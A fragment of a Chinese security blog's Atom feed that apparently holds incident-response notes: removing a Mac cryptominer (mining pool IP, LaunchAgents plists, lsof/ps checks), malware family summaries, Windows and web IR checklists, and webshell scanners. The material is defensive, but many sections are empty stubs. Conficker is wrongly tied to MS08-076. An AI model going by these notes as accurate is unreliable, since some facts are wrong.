    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>网络安全圈一年一度的叉叉行动的前期准备过程中，在客户现场进行失陷主机监测和处置。通过态势感知发现某台终端主机有每五分钟向矿池（43.249.204.183:8888）发起一次连接请求的情况，态势报挖矿行为。<br><img src="https://img-blog.csdnimg.cn/20200926143459961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="态势报毒"><br>但是系统运行正常，并无挖矿行为。猜测应该是中了挖矿病毒但不知道什么原因一直连接不上矿池的原因吧。</p><h1 id="排查过程"><a href="#排查过程" class="headerlink" title="排查过程"></a>排查过程</h1><p>拿来机器到手，是台Mac。首先使用其本机上的“趋势大师查杀了一遍”，果然有结果：<br><img src="https://img-blog.csdnimg.cn/20200926145319636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="趋势大师扫描结果"><br>查了ssl3.plist文件相关的信息，实锤了挖矿病毒程序：<br><img src="https://img-blog.csdnimg.cn/20200926150659651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="关于ssl3.plist的信息"><br>寻思着使用趋势大师直接杀掉，但是是我想多了。它只会告诉你有这个文件，但不会告诉你在哪，想直接文件删除？不好意思，收费！<br>故展开一次从进程开始从到至尾的病毒排查和处置。</p><h2 id="定位进程和文件"><a href="#定位进程和文件" class="headerlink" title="定位进程和文件"></a>定位进程和文件</h2><p>首先使用top命令查看电脑的运行状态。未检查到有ssl3.plist、ssl4.plist字样的程序在运行。<br>（此处本应该有图，但是忘记截图拍照了）<br>由于态势报每五分钟一次请求、这里有没有相关进程，推测应该是没五分钟开启一次进程，那么久循环查看占用8888端口的进程：<br><img src="https://img-blog.csdnimg.cn/20201002151117815.png#pic_center" alt="在这里插入图片描述"><br>找到进程号5666的进行占用8888端口，根据程进程号来定位程序的文件：<br><img src="https://img-blog.csdnimg.cn/20201002152329457.png#pic_center" alt="在这里插入图片描述"><br>找到了文件所在位置，查看文件夹相关内容内容如下：<br><img src="https://img-blog.csdnimg.cn/20201002153152522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>包含了cpu.txt、pools.txt以及ssl3.plist、ssl4.plist等文件。 </p><h2 id="删除文件结束进程"><a href="#删除文件结束进程" class="headerlink" title="删除文件结束进程"></a>删除文件结束进程</h2><p>删除病毒相关文件。kill掉进程。（此处本该有图，但是忘记了。）<br>一般情况下，开机启动项里面也应该会被注入相关病毒文件，查看开机启动项文件夹：<code>~/Library/LaunchAgents</code>，果然发现存在ssl3.plist、ssl4.plist字样文件（不好意思，又没图），删除掉相关文件。</p><h2 id="继续监测"><a href="#继续监测" class="headerlink" title="继续监测"></a>继续监测</h2><p>病毒文件被删除了，进程被结束了。然后继续监测8888端口进程，都没有发现相关进程再启动了：<br><img src="https://img-blog.csdnimg.cn/20201004153506108.png#pic_center" alt="在这里插入图片描述"><br>于是关机在开机，监测了片刻，哪哪都正常了。</p><h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1><p>物归原主。</p><h1 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h1><h2 id="关于ssl3-plist、ssl4-plist"><a href="#关于ssl3-plist、ssl4-plist" class="headerlink" title="关于ssl3.plist、ssl4.plist"></a>关于ssl3.plist、ssl4.plist</h2><p>ssl3.plist、ssl4.plist 其实都是 xmr-stak-rx，xmr-stak 是一款集成了 CPU、GPU 挖矿的工具，由最初的 xmr-stak-cpu、xmr-stak-amd 和 xmr-stak-nvidia 三款集成而来，支持 64 位的 Windows、Linux 和 MacOS 系统。后面还出了 xmr-stak-rx，支持 RandomX 算法。</p><h2 id="排查中用到的指令"><a href="#排查中用到的指令" class="headerlink" title="排查中用到的指令"></a>排查中用到的指令</h2><blockquote><p>top //查看电脑运行状态<br>lsof -i:port  //查看占用port端口的进程<br>ps aux | grep ssl  //查找ssl字样的进程</p></blockquote><p>参考文章：<a href="https://www.tr0y.wang/2020/03/05/MacOS%E7%9A%84ssl4.plist%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E6%8E%92%E6%9F%A5%E8%AE%B0%E5%BD%95/" target="_blank" rel="external nofollow noopener noreferrer">https://www.tr0y.wang/2020/03/05/MacOS%E7%9A%84ssl4.plist%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E6%8E%92%E6%9F%A5%E8%AE%B0%E5%BD%95/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;网络安全圈一年一度的叉叉行动的前期准备过程中，在客户现场进行失陷主机监测和处置。通过态势感知发现某台终端主机有每五分钟向矿池（43.249.
      
    
    </summary>
    
    
      <category term="应急响应" scheme="https://s40d1.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/IOT%E6%B8%97%E9%80%8F/%E7%97%85%E6%AF%92%E5%88%9D%E7%BA%A7%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    <id>https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/IOT%E6%B8%97%E9%80%8F/%E7%97%85%E6%AF%92%E5%88%9D%E7%BA%A7%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</id>
    <published>2020-09-12T00:00:21.185Z</published>
    <updated>2020-06-18T13:53:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="常见病毒类型和特点"><a href="#常见病毒类型和特点" class="headerlink" title="常见病毒类型和特点"></a>常见病毒类型和特点</h1><h2 id="常见分类"><a href="#常见分类" class="headerlink" title="常见分类"></a>常见分类</h2><h3 id="蠕虫"><a href="#蠕虫" class="headerlink" title="蠕虫"></a>蠕虫</h3><p>文件夹</p><h4 id="飞客蠕虫（conficker）"><a href="#飞客蠕虫（conficker）" class="headerlink" title="飞客蠕虫（conficker）"></a>飞客蠕虫（conficker）</h4><p>445端口传播，利用MS08-076漏洞发起攻击。中毒症状包括请求解析随机域名（DGA）、不能正常访问安全厂商的网站或服务器、下载木马。<a href="https://www.0daybank.org/?p=15879" target="_blank" rel="external nofollow noopener noreferrer">详情</a><br><img src="EABB6AE6FDBA40348058F59A8C7767D1" alt="image"></p><h4 id="文件夹蠕虫（FakeFolder）"><a href="#文件夹蠕虫（FakeFolder）" class="headerlink" title="文件夹蠕虫（FakeFolder）"></a>文件夹蠕虫（FakeFolder）</h4><p>设置源文件夹隐藏属性，并且自己伪装成文件夹，通过修改注册表系统属性，通常通过共享、U盘传播。</p><h4 id="Morto蠕虫"><a href="#Morto蠕虫" class="headerlink" title="Morto蠕虫"></a>Morto蠕虫</h4><p>通过RDP爆破传播，通过注册表、服务等进行驻留。</p><h4 id="NetSky蠕虫"><a href="#NetSky蠕虫" class="headerlink" title="NetSky蠕虫"></a>NetSky蠕虫</h4><p>获取本地邮箱地址，通过邮件服务器传播包含病毒体的邮件</p><h3 id="挖矿病毒"><a href="#挖矿病毒" class="headerlink" title="挖矿病毒"></a>挖矿病毒</h3><h4 id="Wannamine系列"><a href="#Wannamine系列" class="headerlink" title="Wannamine系列"></a>Wannamine系列</h4><h3 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h3><h3 id="感染型病毒（不能做清除，而是做修复）"><a href="#感染型病毒（不能做清除，而是做修复）" class="headerlink" title="感染型病毒（不能做清除，而是做修复）"></a>感染型病毒（不能做清除，而是做修复）</h3><h4 id="Ramnit"><a href="#Ramnit" class="headerlink" title="Ramnit"></a>Ramnit</h4><p>感染html文件，插入vbs脚本，会进行客户端vbs脚本传播。<a href="https://www.52pojie.cn/thread-757290-1-1.html" target="_blank" rel="external nofollow noopener noreferrer">详情</a><br><img src="2208C49CC44D499E82542EF0ABCFB791" alt="image"></p><h3 id="宏病毒"><a href="#宏病毒" class="headerlink" title="宏病毒"></a>宏病毒</h3><p>文档类，</p><h3 id="勒索病毒"><a href="#勒索病毒" class="headerlink" title="勒索病毒"></a>勒索病毒</h3><p>感染文件，勒索赎金，没办法破解</p><h1 id="应急工具"><a href="#应急工具" class="headerlink" title="应急工具"></a>应急工具</h1><h2 id="基础工具"><a href="#基础工具" class="headerlink" title="基础工具"></a>基础工具</h2><p>Process Hacker procexp &gt; 进程操作，服务操作<br>Autoruns &gt; 计划任务，启动项，服务，WMI<br>Everything &gt; 文件搜索<br>PChunter &gt; 文件，驱动（驱动型工具，可以绕过应用层的防护）</p><h2 id="进阶工具"><a href="#进阶工具" class="headerlink" title="进阶工具"></a>进阶工具</h2><h3 id="Sysmon"><a href="#Sysmon" class="headerlink" title="Sysmon"></a>Sysmon</h3><p>安装：Sysmon.exe -acceptula -i -n<br>日志路径：%system%\system32\winevt\logs\microsoft-windows=sysmon%4Operational.evtx<br>卸载：sysmon.exe -u</p><h1 id="流行病毒查杀思路"><a href="#流行病毒查杀思路" class="headerlink" title="流行病毒查杀思路"></a>流行病毒查杀思路</h1><h2 id="勒索时间信息收集"><a href="#勒索时间信息收集" class="headerlink" title="勒索时间信息收集"></a>勒索时间信息收集</h2><h3 id="是否正在进行加密"><a href="#是否正在进行加密" class="headerlink" title="是否正在进行加密"></a>是否正在进行加密</h3><h1 id="“徒手杀毒”招式分解"><a href="#“徒手杀毒”招式分解" class="headerlink" title="“徒手杀毒”招式分解"></a>“徒手杀毒”招式分解</h1><h2 id="观察对象"><a href="#观察对象" class="headerlink" title="观察对象"></a>观察对象</h2><h2 id="恶意软件商最爱的目录排行"><a href="#恶意软件商最爱的目录排行" class="headerlink" title="恶意软件商最爱的目录排行"></a>恶意软件商最爱的目录排行</h2><h1 id="快速判断文件“黑白”"><a href="#快速判断文件“黑白”" class="headerlink" title="快速判断文件“黑白”"></a>快速判断文件“黑白”</h1><h2 id="安全软件报出的文件判断"><a href="#安全软件报出的文件判断" class="headerlink" title="安全软件报出的文件判断"></a>安全软件报出的文件判断</h2><h3 id="木马类-Trojan-Backdoop"><a href="#木马类-Trojan-Backdoop" class="headerlink" title="木马类 - Trojan Backdoop"></a>木马类 - Trojan Backdoop</h3><p>如果不是业务程序软件，建议隔离<br>四段式：Trojan.Win32.Wannamine.ufajg<br>其他：TR/Lokibot.gen</p><h2 id="借助威胁情报判断文件威胁"><a href="#借助威胁情报判断文件威胁" class="headerlink" title="借助威胁情报判断文件威胁"></a>借助威胁情报判断文件威胁</h2><h2 id="通过沙箱判断行为"><a href="#通过沙箱判断行为" class="headerlink" title="通过沙箱判断行为"></a>通过沙箱判断行为</h2><h2 id="其他补充技巧"><a href="#其他补充技巧" class="headerlink" title="其他补充技巧"></a>其他补充技巧</h2><ul><li>图标和文件类型是否对应</li><li>看似正常系统文件，看MD5</li><li>是否具有签名</li><li>强壳、混淆</li></ul><h1 id="常见应急工具"><a href="#常见应急工具" class="headerlink" title="常见应急工具"></a>常见应急工具</h1><h2 id><a href="#" class="headerlink" title></a></h2><p>##</p><h2 id="分析工具"><a href="#分析工具" class="headerlink" title="分析工具"></a>分析工具</h2><h3 id="Process-Hacker"><a href="#Process-Hacker" class="headerlink" title="Process Hacker"></a>Process Hacker</h3><h1 id="常见病毒处置"><a href="#常见病毒处置" class="headerlink" title="常见病毒处置"></a>常见病毒处置</h1><h2 id="常见挖矿病毒处置"><a href="#常见挖矿病毒处置" class="headerlink" title="常见挖矿病毒处置"></a>常见挖矿病毒处置</h2><p>中挖矿木马的计算机，资源会被大量占用，用于数字加密币的挖掘。</p><h2 id="挖矿病毒的原理"><a href="#挖矿病毒的原理" class="headerlink" title="挖矿病毒的原理"></a>挖矿病毒的原理</h2><p>stratum协议是目前最常用的矿机和矿池之间的TCP协议。以下是挖矿的网络结构：  </p><h2 id="挖矿病毒分析"><a href="#挖矿病毒分析" class="headerlink" title="挖矿病毒分析"></a>挖矿病毒分析</h2><p>一般挖矿病毒的最明显特征：进程资源占用高50%/25%/100%，可通过判断通信地址为矿池来判断终端可能再进行挖矿。<br>验证挖矿主机常用以下工具：</p><ol><li>微步在线</li><li>搜索引擎</li><li>wireshark、tcpdump等抓包工具   </li></ol><p>发现挖矿程序，一般会伴随着自启动操作。<br>服务：tasklist /svc、process hacker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\Microsoft\WindowsNT\CurrentControlSet\Services</span><br></pre></td></tr></table></figure><p>任务计划：taskschd.msc</p><p>启动项：<br>VMI：autoruns/wbemtest<br>IPSec：deny445<br>Rookit隐藏：驱动隐藏、attrib -r -s -h、cacls、<br>“file” /g administrator:f</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;常见病毒类型和特点&quot;&gt;&lt;a href=&quot;#常见病毒类型和特点&quot; class=&quot;headerlink&quot; title=&quot;常见病毒类型和特点&quot;&gt;&lt;/a&gt;常见病毒类型和特点&lt;/h1&gt;&lt;h2 id=&quot;常见分类&quot;&gt;&lt;a href=&quot;#常见分类&quot; cl
      
    
    </summary>
    
    
      <category term="渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
      <category term="IOT渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/IOT%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/IOT%E6%B8%97%E9%80%8F/%E6%96%B0%E5%BB%BA%E6%96%87%E6%9C%AC%E6%96%87%E6%A1%A3/"/>
    <id>https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/IOT%E6%B8%97%E9%80%8F/%E6%96%B0%E5%BB%BA%E6%96%87%E6%9C%AC%E6%96%87%E6%A1%A3/</id>
    <published>2020-09-12T00:00:21.185Z</published>
    <updated>2020-06-24T02:09:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external nofollow noopener noreferrer">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external nofollow noopener noreferrer">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external nofollow noopener noreferrer">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external nofollow noopener noreferrer">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external nofollow noopener noreferrer">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external nofollow noopener noreferrer">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external nofollow noopener noreferrer">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="external nofollow noopener noreferrer">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external nofollow noopener noreferrer&quot;&gt;Hexo&lt;/a&gt;! This is your very first post.
      
    
    </summary>
    
    
      <category term="渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
      <category term="IOT渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/IOT%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/IOT%E6%B8%97%E9%80%8F/Windows%E7%B3%BB%E7%BB%9F%E7%9B%91%E6%8E%A7Sysmon/"/>
    <id>https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/IOT%E6%B8%97%E9%80%8F/Windows%E7%B3%BB%E7%BB%9F%E7%9B%91%E6%8E%A7Sysmon/</id>
    <published>2020-09-12T00:00:21.183Z</published>
    <updated>2020-06-21T00:54:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="sysmon简介"><a href="#sysmon简介" class="headerlink" title="sysmon简介"></a>sysmon简介</h1><p>用于监视和记录系统活动，并记录到Windows时间日志，可提供有关进程的创建、网络连接和文件创建时间更改的详细信息。<br>通过集成Windows事件集合或SIEM代理生成的事件，然后分析他们，可识别恶意或异常活动，并了解在网络上是如何的恶意操作。</p><h1 id="安装与配置"><a href="#安装与配置" class="headerlink" title="安装与配置"></a>安装与配置</h1><p>安装命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sysmon64.exe -acceptula -i z-AlphaVersion.xml</span><br></pre></td></tr></table></figure><h1 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;sysmon简介&quot;&gt;&lt;a href=&quot;#sysmon简介&quot; class=&quot;headerlink&quot; title=&quot;sysmon简介&quot;&gt;&lt;/a&gt;sysmon简介&lt;/h1&gt;&lt;p&gt;用于监视和记录系统活动，并记录到Windows时间日志，可提供有关
      
    
    </summary>
    
    
      <category term="渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
      <category term="IOT渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/IOT%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/IOT%E6%B8%97%E9%80%8F/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8E%92%E6%9F%A5/"/>
    <id>https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/IOT%E6%B8%97%E9%80%8F/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8E%92%E6%9F%A5/</id>
    <published>2020-09-12T00:00:21.180Z</published>
    <updated>2020-06-18T13:53:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="一、进程排查"><a href="#一、进程排查" class="headerlink" title="一、进程排查"></a>一、进程排查</h1><h2 id="独立进程块"><a href="#独立进程块" class="headerlink" title="独立进程块"></a>独立进程块</h2><p>病毒是独立的可执行文件，以独立进程运行。进程名要么随机，要么相似于系统进程</p><h2 id="动态库模块"><a href="#动态库模块" class="headerlink" title="动态库模块"></a>动态库模块</h2><p>以动态库的方式注入到系统进程和应用程序。</p><h2 id="隐藏模块"><a href="#隐藏模块" class="headerlink" title="隐藏模块"></a>隐藏模块</h2><h1 id="二、网络行为排查"><a href="#二、网络行为排查" class="headerlink" title="二、网络行为排查"></a>二、网络行为排查</h1><h2 id="重要辅助站点"><a href="#重要辅助站点" class="headerlink" title="重要辅助站点"></a>重要辅助站点</h2><ol><li><a href="https://www.virustotal.com/国外知名站点" target="_blank" rel="external nofollow noopener noreferrer">https://www.virustotal.com/国外知名站点</a><h2 id="网络连接排查"><a href="#网络连接排查" class="headerlink" title="网络连接排查"></a>网络连接排查</h2><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h2 id="漏洞与补丁信息"><a href="#漏洞与补丁信息" class="headerlink" title="漏洞与补丁信息"></a>漏洞与补丁信息</h2><img src="D9E9900A2C3A41EC8D3FCE4519473BF0" alt="image"><h1 id="三、文件排查"><a href="#三、文件排查" class="headerlink" title="三、文件排查"></a>三、文件排查</h1><h2 id="临时目录排查"><a href="#临时目录排查" class="headerlink" title="临时目录排查"></a>临时目录排查</h2></li></ol><h2 id="浏览器相关文件排查"><a href="#浏览器相关文件排查" class="headerlink" title="浏览器相关文件排查"></a>浏览器相关文件排查</h2><h2 id="最近打开文件排查"><a href="#最近打开文件排查" class="headerlink" title="最近打开文件排查"></a>最近打开文件排查</h2><h2 id="文件时间排查"><a href="#文件时间排查" class="headerlink" title="文件时间排查"></a>文件时间排查</h2><h2 id="其他重要目录查询"><a href="#其他重要目录查询" class="headerlink" title="其他重要目录查询"></a>其他重要目录查询</h2><p>system32也是常见的病毒释放目录，需检查hosts文件有没有被篡改。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32</span><br><span class="line">C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><p><img src="F0E7FE1ED20D490DB97A8B4DEECC9DAB" alt="image"></p><h1 id="四、远程登录排查"><a href="#四、远程登录排查" class="headerlink" title="四、远程登录排查"></a>四、远程登录排查</h1><h2 id="Windows日志"><a href="#Windows日志" class="headerlink" title="Windows日志"></a>Windows日志</h2><h2 id="RDP远程登录排查"><a href="#RDP远程登录排查" class="headerlink" title="RDP远程登录排查"></a>RDP远程登录排查</h2><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><h1 id="五、启动方式排查"><a href="#五、启动方式排查" class="headerlink" title="五、启动方式排查"></a>五、启动方式排查</h1><h2 id="启动项排查"><a href="#启动项排查" class="headerlink" title="启动项排查"></a>启动项排查</h2><h2 id="任务计划排查"><a href="#任务计划排查" class="headerlink" title="任务计划排查"></a>任务计划排查</h2><h2 id="服务排查"><a href="#服务排查" class="headerlink" title="服务排查"></a>服务排查</h2><h1 id="六、账号安全排查"><a href="#六、账号安全排查" class="headerlink" title="六、账号安全排查"></a>六、账号安全排查</h1><p>compmgmt.msc命令查看计算机上所有用户信息<br>net user 用户名 命令查看指定用户信息</p><p><img src="6A58E9BB35014641B331B965402A6A53" alt="image"><br>通过PCHunter等工具可以查看隐藏用户，如添加$的隐藏账号，以及克隆账号。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;一、进程排查&quot;&gt;&lt;a href=&quot;#一、进程排查&quot; class=&quot;headerlink&quot; title=&quot;一、进程排查&quot;&gt;&lt;/a&gt;一、进程排查&lt;/h1&gt;&lt;h2 id=&quot;独立进程块&quot;&gt;&lt;a href=&quot;#独立进程块&quot; class=&quot;heade
      
    
    </summary>
    
    
      <category term="渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
      <category term="IOT渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/IOT%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/IOT%E6%B8%97%E9%80%8F/web%E5%88%9D%E7%BA%A7%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    <id>https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/IOT%E6%B8%97%E9%80%8F/web%E5%88%9D%E7%BA%A7%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</id>
    <published>2020-09-12T00:00:21.178Z</published>
    <updated>2020-06-18T16:04:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="web入侵简介"><a href="#web入侵简介" class="headerlink" title="web入侵简介"></a>web入侵简介</h1><h2 id="web入侵流程"><a href="#web入侵流程" class="headerlink" title="web入侵流程"></a>web入侵流程</h2><p>信息收集 &gt; 漏洞扫描 &gt; 渗透攻击 &gt; 提权/挂黑链 &gt; 后渗透攻击 &gt; 持续控制</p><h2 id="web入侵方法"><a href="#web入侵方法" class="headerlink" title="web入侵方法"></a>web入侵方法</h2><ol><li>通过web脚本或框架的漏洞获取webshell</li><li>通过获取cms的后台账号密码并登录</li><li>通过数据库开放的端口作为入口，爆破或猜解进入</li><li>通过web脚本或框架漏洞获取敏感权限或数据<h2 id="web恶意代码事件"><a href="#web恶意代码事件" class="headerlink" title="web恶意代码事件"></a>web恶意代码事件</h2></li></ol><ul><li>WEBSHELL</li><li>黑链广告文件</li><li>恶意挂马页面<h2 id="web应用应急响应流程"><a href="#web应用应急响应流程" class="headerlink" title="web应用应急响应流程"></a>web应用应急响应流程</h2>确认攻击类型 &gt; 异常信息收集 &gt; 排查黑链 &gt; 排查webshell &gt; 分析web日志 &gt; 时间总结<h2 id="web应急响应需要处理的问题"><a href="#web应急响应需要处理的问题" class="headerlink" title="web应急响应需要处理的问题"></a>web应急响应需要处理的问题</h2></li></ul><ol><li>发现黑链/暗链跳转等被篡改现象</li><li>发现webshell等<h1 id="黑帽SEO-黑链"><a href="#黑帽SEO-黑链" class="headerlink" title="黑帽SEO-黑链"></a>黑帽SEO-黑链</h1><h3 id="SEO-搜索引擎优化"><a href="#SEO-搜索引擎优化" class="headerlink" title="SEO-搜索引擎优化"></a>SEO-搜索引擎优化</h3>利用搜索引擎的规则提高有关搜索引擎内的自然排名<h3 id="SEO目的"><a href="#SEO目的" class="headerlink" title="SEO目的"></a>SEO目的</h3>搜索结果排名靠前<h3 id="SEO帽子"><a href="#SEO帽子" class="headerlink" title="SEO帽子"></a>SEO帽子</h3>白：遵循规则进行网络推广<br>黑：不遵循规则<h2 id="黑帽SEO-黑链-1"><a href="#黑帽SEO-黑链-1" class="headerlink" title="黑帽SEO-黑链"></a>黑帽SEO-黑链</h2></li></ol><h2 id="黑链的排查思路"><a href="#黑链的排查思路" class="headerlink" title="黑链的排查思路"></a>黑链的排查思路</h2><p>复现黑链存在的现象（搜索引擎复现、多地域访问、终端及服务器端抓包）</p><h2 id="Webshell查杀"><a href="#Webshell查杀" class="headerlink" title="Webshell查杀"></a>Webshell查杀</h2><h3 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h3><p>webshell是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后门，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。</p><h3 id="常见工具"><a href="#常见工具" class="headerlink" title="常见工具"></a>常见工具</h3><table><thead><tr><th>名称</th><th>平台</th><th>下载</th></tr></thead><tbody><tr><td>D盾</td><td>Windows</td><td><a href="http://www.d99net.net/" target="_blank" rel="external nofollow noopener noreferrer">http://www.d99net.net/</a></td></tr><tr><td>悬镜（慎用）</td><td>Linux</td><td><a href="http://www.xmirror.cn/" target="_blank" rel="external nofollow noopener noreferrer">http://www.xmirror.cn/</a></td></tr><tr><td>360主机卫士</td><td>Windows/Linux</td><td><a href="http://zhuji.360.cn/" target="_blank" rel="external nofollow noopener noreferrer">http://zhuji.360.cn/</a></td></tr><tr><td>webshell.pub</td><td>Windows/Linux</td><td><a href="http://www.webshell.pub/" target="_blank" rel="external nofollow noopener noreferrer">http://www.webshell.pub/</a></td></tr><tr><td>安全狗</td><td>Windows/Linux</td><td><a href="http://www.safedog.cn/" target="_blank" rel="external nofollow noopener noreferrer">http://www.safedog.cn/</a></td></tr><tr><td>Sangfor WebshellKiller 3.2</td><td>Windows/Linux</td><td></td></tr><tr><td>### 查杀方法</td><td></td><td></td></tr><tr><td>#### 工具扫描</td><td></td><td></td></tr><tr><td>#### 文件属性（创建时间、修改时间）</td><td></td><td></td></tr><tr><td>#### 文件特征（静态特征、动态特征）</td><td></td><td></td></tr><tr><td>#### 文件对比</td><td></td><td></td></tr><tr><td>#### 搜索引擎</td><td></td><td></td></tr><tr><td>将代码拖去搜索引擎搜索是否为webshell。</td><td></td><td></td></tr><tr><td>确认webshell之后删除即可</td><td></td><td></td></tr><tr><td>## 